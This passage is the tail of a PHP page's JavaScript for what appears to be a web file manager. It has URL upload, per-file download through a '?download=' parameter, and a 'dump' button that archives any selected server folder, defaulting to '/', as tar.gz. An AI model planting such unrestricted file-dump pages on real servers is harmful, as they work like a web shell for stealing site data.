                    if (nested) {
                        refreshFolder(uploadPath, nested);
                    }
                }
            } else {
                alert('URL upload error: ' + data.error);
            }
        })
        .catch(err => {
            alert('URL upload failed: ' + err.message);
        });
    }

    document.getElementById('urlUploadSubmit').addEventListener('click', () => {
        uploadFromUrl();
    });

    document.getElementById('file-tree').addEventListener('dblclick', function (e) {
        if (e.target.classList.contains('file')) {
            const filename = e.target.textContent.trim();
            const selectedPath = document.getElementsByClassName('selectedPath')[0].value || '/';
            const filePath = selectedPath.replace(/\/+$/, '') + '/' + filename;

            const a = document.createElement('a');
            a.href = '?download=' + encodeURIComponent(filePath);
            a.download = filename;
            document.body.appendChild(a);
            a.click();
            document.body.removeChild(a);
        }
    });

    document.getElementById('dumpFolder').addEventListener('click', function() {
        const selectedPath = document.getElementsByClassName('selectedPath')[0].value || '/';
        const overlay = document.getElementById('loading-overlay');

        overlay.style.display = 'flex'; // show loading

        // Send request to dump and get the file as a blob
        fetch(window.location.pathname + '?dump=' + encodeURIComponent(selectedPath))
            .then(response => {
                if (!response.ok) throw new Error('Network response was not OK');
                return response.blob();
            })
            .then(blob => {
                // Create a temporary download link
                const url = window.URL.createObjectURL(blob);
                const a = document.createElement('a');
                a.href = url;
                a.download = selectedPath.replace(/[\/\\]/g, '_') + '.tar.gz';
                document.body.appendChild(a);
                a.click();
                a.remove();
                window.URL.revokeObjectURL(url);
            })
            .catch(err => {
                alert('Failed to download archive: ' + err.message);
            })
            .finally(() => {
                overlay.style.display = 'none'; // hide loading after everything
            });
    });
</script>

</html>
<?php

// !   MAIN HTML STOP
?>